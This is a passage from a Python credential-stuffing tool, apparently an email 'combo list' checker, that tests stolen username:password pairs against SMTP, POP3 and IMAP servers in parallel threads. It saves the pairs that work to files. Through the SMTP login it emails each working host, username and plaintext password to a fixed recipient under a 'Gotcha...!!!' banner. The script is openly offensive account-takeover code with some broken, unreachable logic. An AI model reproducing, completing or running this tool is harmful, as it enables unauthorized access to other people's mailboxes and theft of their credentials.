        print(Fore.RED + f'P0P3 N0T W0RK3D !!!! Let celebrate it !!! =>>> {server} ' + Fore.CYAN + get_random_quote_from_all() + Style.RESET_ALL)
        return False

def check_imap_server(server, port, username, password):
    try:
        imap_conn = imaplib.IMAP4_SSL(server, port)
        imap_conn.login(username, password)
        imap_conn.logout()
        print(Fore.GREEN + f'1M4P W0RK3D !!!! ===>>> {server} ' + Fore.CYAN + get_random_quote_from_all() + Style.RESET_ALL)
        return True
    except Exception as e:
        print(Fore.RED + f'1M4P N0T W0RK3D !!!! Let celebrate it !!! =>>> {server} ' + Fore.CYAN + get_random_quote_from_all() + Style.RESET_ALL)
        return False

def get_server_ports(server_type, server_name):
    if server_type in SERVERS and server_name in SERVERS[server_type]:
        return SERVERS[server_type][server_name]
    return None

def add_server_to_list(server_type, server_name, server_address, ports):
    if server_type not in SERVERS:
        SERVERS[server_type] = {}
    SERVERS[server_type][server_name] = (server_address, ports)
    print(Fore.YELLOW + f'53RV3R {server_name} 4DD3D T0 {server_type.upper()} L1ST' + Fore.CYAN + get_random_quote_from_all() + Style.RESET_ALL)

class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as e:
                print(e)
            self.tasks.task_done()

class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()

def worker(combo, server_type, servers):
    username, password = [x.strip() for x in combo.split(':')]
    now = datetime.now()
    date_str = now.strftime("%Y-%m-%d")
    time_str = now.strftime("%H:%M:%S")

    # Extract domain from the username (email address)
    domain = username.split('@')[-1] if '@' in username else 'example.com'

    for server_name, (server_address, server_ports) in servers.items():
        for server_port in server_ports:
            valid = False
            print(f"Trying to find {server_type.upper()} server...")

            try:
                # Attempt to find MX records if needed
                if server_type in ['smtp', 'pop3', 'imap']:
                    if server_type == 'smtp':
                        mx_servers = find_mx_records(domain)  # Use the domain from the combo
                        if mx_servers:
                            print(f"Found MX servers: {mx_servers}")
                        else:
                            print(f"No MX servers found for the domain.")
                        
                    # Example server discovery, modify as needed
                    if server_type == 'smtp':
                        print(f"Trying SMTP server: {server_address}:{server_port}")
                        valid = send_html_email(
                            subject=f'S.M.T.P - T.E.R.G.R.A.B | By AnnaQitty {date_str} sent on {time_str}',
                            html_content=f'''
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>S.M.T.P - T.E.R.G.R.A.B | By AnnaQitty</title>
            <style>
                body {{
                    font-family: Arial, sans-serif;
                    color: #333;
                    background-color: #f4f4f4;
                    margin: 0;
                    padding: 0;
                }}
                .container {{
                    width: 100%;
                    max-width: 600px;
                    margin: 0 auto;
                    background-color: #ffffff;
                    border-radius: 8px;
                    box-shadow: 0 0 10px rgba(0,0,0,0.1);
                    overflow: hidden;
                }}
                .header {{
                    background-color: #007bff;
                    color: #ffffff;
                    padding: 20px;
                    text-align: center;
                }}
                .header h1 {{
                    margin: 0;
                    font-size: 24px;
                }}
                .content {{
                    padding: 20px;
                }}
                .content p {{
                    margin: 0 0 10px;
                    font-size: 16px;
                    line-height: 1.5;
                }}
                .content p strong {{
                    color: #007bff;
                }}
                .footer {{
                    background-color: #f1f1f1;
                    padding: 10px;
                    text-align: center;
                    font-size: 14px;
                    color: #666;
                }}
                .footer p {{
                    margin: 0;
                }}
                .section-title {{
                    font-weight: bold;
                    margin: 20px 0 10px;
                    font-size: 18px;
                    color: #007bff;
                }}
                .section {{
                    margin-bottom: 20px;
                    padding: 10px;
                    border-radius: 4px;
                    background-color: #f9f9f9;
                    box-shadow: 0 0 5px rgba(0,0,0,0.1);
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>S.M.T.P - T.E.R.G.R.A.B | By AnnaQitty</h1>
                </div>
                <div class="content">
                    <p>Gotcha...!!!</p>
                    <p>Below are the details you requested:</p>
                    <div class="section">
                        <p class="section-title">Details</p>
                        <p><strong>URL:</strong> {smtp_server}</p>
                        <p><strong>HOST:</strong> {smtp_server}|{server_address}</p>
                        <p><strong>PORT:</strong> {smtp_port}|{server_port}</p>
                        <p><strong>USER:</strong> {username}</p>
                        <p><strong>PASSW:</strong> {password}</p>
                        <p><strong>SENDER:</strong> {username}</p>
                        <p><p><p>{server_address}|{server_port}|{username}|{password}</p></p>
                    </div>
                    <p>Thanks for using this tool. If you have any questions or need further assistance, feel free to <a href="mailto:annaqitty@gmail.com">email me</a>.</p>
                </div>
                <div class="footer">
                    <p>&copy; 2024 Anna Qitty. All rights reserved.</p>
                </div>
            </div>
        </body>
        </html>\n                       
                            
                            

                            ''',
                            from_email=username,
                            password=password,
                            to_email=TEST_RECIPIENT,
                            smtp_server=server_address,
                            smtp_port=server_port
                        )
                    
                    elif server_type == 'pop3':
                        print(f"Trying POP3 server: {server_address}:{server_port}")
                        valid = check_pop3_server(server_address, server_port, username, password)

                    elif server_type == 'imap':
                        print(f"Trying IMAP server: {server_address}:{server_port}")
                        valid = check_imap_server(server_address, server_port, username, password)
            except Exception as e:
                print(Fore.RED + f"N0 N33D T0 W41T F0R C0NT4CT M3 : xxx.newtask.xxx@gmail.com" + Fore.CYAN + get_random_quote_from_all() + Style.RESET_ALL)
                continue
            
                if valid:
                    if server_type == 'smtp':
                        with open('W0RK3D-5MTP.txt', 'a') as oo:
                            oo.write(combo + '\n')
                        out = f'{server_address}|{server_port}|{combo.replace(":", "|")}'
                        with open('W0RK3D-5MTPcls.txt', 'a') as out_file:
                            out_file.write(out + '\n')
                        print(Fore.GREEN + f'W0RK3D 5MTP !!!! ===>>> {combo} | '+ Fore.CYAN + {quote} + Style.RESET_ALL)

                    if server_type == 'pop3':
                        with open('W0RK3D-P0P3.txt', 'a') as pop3_file:
                            pop3_file.write(combo + '\n')
                        print(Fore.GREEN + f'W0RK3D P0P3 !!!! ===>>> {combo} | '+ Fore.CYAN + {quote} + Style.RESET_ALL)

                    if server_type == 'imap':
                        with open('W0RK3D-1M4P.txt', 'a') as imap_file:
                            imap_file.write(combo + '\n')
                        print(Fore.GREEN + f'W0RK3D 1M4P !!!! ===>>> {combo} | '+ Fore.CYAN + {quote} + Style.RESET_ALL)

def banner():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]

    x = """
       ___
     o|* *|o  ╔╦═╦╗╔╦╗╔╦═╦╗
     o|* *|o  ║║╔╣╚╝║║║║║║║
     o|* *|o  ║║╚╣╔╗║╚╝║╩║║
      ║===/   ║╚═╩╝╚╩══╩╩╝║
       |||    ╚═══════════╝
       |||  K.E.U.R - E.M.A.I.L
       |||    ╔═╦═╦╦═╦╦═╗╔═╦╦══╦══╦╦╗
       |||    ║╩║║║║║║║╩║║╚║╠╗╔╩╗╔╩╗║
    ___|||___ ╚╩╩╩═╩╩═╩╩╝╚═╩╝╚╝ ╚╝ ╚╝

      By : AnnaQitty
      Github : github.com/annaqitty    
                                              
                          
                          
                                      """
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)

def process_file(file_path):
    with open(file_path, 'r', encoding='utf-8') as f:
        combos = f.read().splitlines()

    num_threads = int(input(Fore.LIGHTGREEN_EX + '+[+] Threads : ' + Style.RESET_ALL))
    
    pool = ThreadPool(num_threads)
    
    for server_type, servers in SERVERS.items():
        print(f"Processing server type: {server_type}")
        for combo in combos:
            pool.add_task(worker, combo, server_type, servers)
    
    pool.wait_completion()
    print(Fore.LIGHTGREEN_EX + 'Good Job !! Completed Checked\n' + ban + Style.RESET_ALL)

# Example usage
banner()
file_path = input(Fore.RED + '+[+] ComboList : ' + Style.RESET_ALL)
process_file(file_path)
